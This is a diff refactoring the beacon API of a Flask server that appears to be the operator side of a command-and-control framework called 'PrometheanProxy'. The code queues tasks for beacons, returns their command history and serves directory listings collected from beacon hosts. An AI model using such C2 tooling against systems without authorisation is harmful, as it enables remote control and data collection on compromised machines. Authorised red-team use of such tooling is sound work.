@@ -1,3 +1,5 @@
+import os
+import json
 from flask import (Flask,
                    render_template,
                    jsonify,
@@ -25,72 +27,92 @@ def handle_join(data):
     logger.info(f"Client joined room: {uuid}")
 
 
-@app.route('/api/v1/beacons', methods=['GET', 'POST'])  # Added 'POST' method
+@app.route('/api/v1/beacons', methods=['GET', 'POST'])
 def api_beacons():
-    # Log incoming request method and IP
-    logger.info(f"Received {request.method} request from {request.remote_addr}") # noqa
+    logger.info(f"Received {request.method} request from {request.remote_addr}")
     if request.remote_addr != '127.0.0.1':
         logger.warning("Access denied from non-local address.")
         return jsonify({"error": "Access denied"}), 403
 
+    # POST /api/v1/beacons?command=<uuid>
     if request.method == 'POST' and request.args.get('command'):
-        logger.info("Command API called via POST")
-        uuid = request.args.get('command')
-        try:
-            request_data = request.get_json()
-            beacon_uuid = request_data.get('command_id')
-            logger.debug(f"Command UUID: {uuid}, Data: {request_data}")
-            if request_data and "task" in request_data:
-                add_beacon_command_list(uuid,
-                                        beacon_uuid, request_data["task"],
-                                        request_data["data"])
-                logger.info(f"Command added for UUID: {uuid}")
-                socketio.emit('command_response', {
-                    'uuid': uuid,
-                    'command_id': request_data["command_id"],
-                    'command': request_data["task"],
-                    'response': request_data["data"]
-                }, room=uuid)
-                return jsonify({"status": "Command added"})
-            else:
-                logger.error("No data provided in POST request.")
-                return jsonify({"error": "No data provided"}), 400
-        except KeyError as e:
-            return jsonify({"error": f"Missing key: {str(e)}"}), 400
+        uuid = request.args['command']
+        logger.info(f"Command API called for beacon {uuid}")
+        data = request.get_json(silent=True) or {}
+        cmd_id = data.get('command_id')
+        task  = data.get('task')
+        payload = data.get('data')
+        if not (cmd_id and task):
+            logger.error("Missing command_id or task in POST data.")
+            return jsonify({"error": "Missing command_id or task"}), 400
 
-    elif request.method == 'GET':
+        add_beacon_command_list(uuid, cmd_id, task, payload)
+        logger.info(f"Added command {cmd_id} ({task}) to beacon {uuid}")
+        socketio.emit('command_response', {
+            'uuid': uuid,
+            'command_id': cmd_id,
+            'command': task,
+            'response': payload
+        }, room=uuid)
+        return jsonify({"status": "Command added"}), 200
+
+    # GET /api/v1/beacons?... 
+    if request.method == 'GET':
+        # 1) Directory traversal tree
+        if request.args.get('dirTraversal'):
+            uuid = request.args['dirTraversal']
+            beacon = beacon_list.get(uuid)
+            if not beacon:
+                logger.error(f"dirTraversal: unknown UUID {uuid}")
+                return jsonify({"error": "Beacon not found"}), 404
+
+            tree_file = os.path.expanduser(
+                f"~/.PrometheanProxy/{uuid}/directory_traversal.json"
+            )
+            if not os.path.isfile(tree_file):
+                logger.error(f"dirTraversal file missing for UUID {uuid}")
+                return jsonify({"error": "Directory traversal not found"}), 404
+
+            try:
+                with open(tree_file, 'r') as f:
+                    tree = json.load(f)
+                return jsonify(tree), 200
+            except Exception as e:
+                logger.error(f"Error reading dirTraversal JSON: {e}")
+                return jsonify({"error": str(e)}), 500
+
+        # 2) History of non-directory_traversal commands
         if request.args.get('history'):
-            uuid = request.args.get('history')
-            # Removed redundant userID assignment
+            uuid = request.args['history']
             history_data = []
-            for command in command_list.values():
-                if command.beacon_uuid == uuid:
-                    history_data.append({
-                        "command_id": command.command_uuid,
-                        "command": command.command,
-                        "response": command.command_output,
-                    })
-            return jsonify({"history": history_data})
-        else:
-            # Handle GET requests without 'history' parameter
-            beacons_grouped = {}
-            # Loop through the beacons and group them by UUID
-            for beaconID, beacon in beacon_list.items():
-                beacons_grouped[beaconID] = {
-                    "address": beacon.address,
-                    "hostname": beacon.hostname,
-                    "operating_system": beacon.operating_system,
-                    "last_beacon": beacon.last_beacon,
-                    "next_beacon": beacon.next_beacon,
-                    "timer": beacon.timer,
-                    "jitter": beacon.jitter
-                }
-            logger.info("Beacons data retrieved via GET")
-            return jsonify({"beacons": beacons_grouped})
+            for cmd in command_list.values():
+                if cmd.beacon_uuid != uuid or cmd.command == "directory_traversal":
+                    continue
+                history_data.append({
+                    "command_id": cmd.command_uuid,
+                    "command": cmd.command,
+                    "response": cmd.command_output
+                })
+            logger.info(f"Returning history for beacon {uuid}")
+            return jsonify({"history": history_data}), 200
 
-    else:
-        return jsonify({"error": "Method not allowed"}), 405
+        # 3) List all beacons
+        beacons_grouped = {}
+        for b_id, beacon in beacon_list.items():
+            beacons_grouped[b_id] = {
+                "address":         beacon.address,
+                "hostname":        beacon.hostname,
+                "operating_system": beacon.operating_system,
+                "last_beacon":     beacon.last_beacon,
+                "next_beacon":     beacon.next_beacon,
+                "timer":           beacon.timer,
+                "jitter":          beacon.jitter
+            }
+        logger.info("Returning all beacons")
+        return jsonify({"beacons": beacons_grouped}), 200
 
+    # Fallback for other methods
+    return jsonify({"error": "Method not allowed"}), 405
 
 @app.route('/api/v1/beacons/<uuid>')
 def api_beacon(uuid):
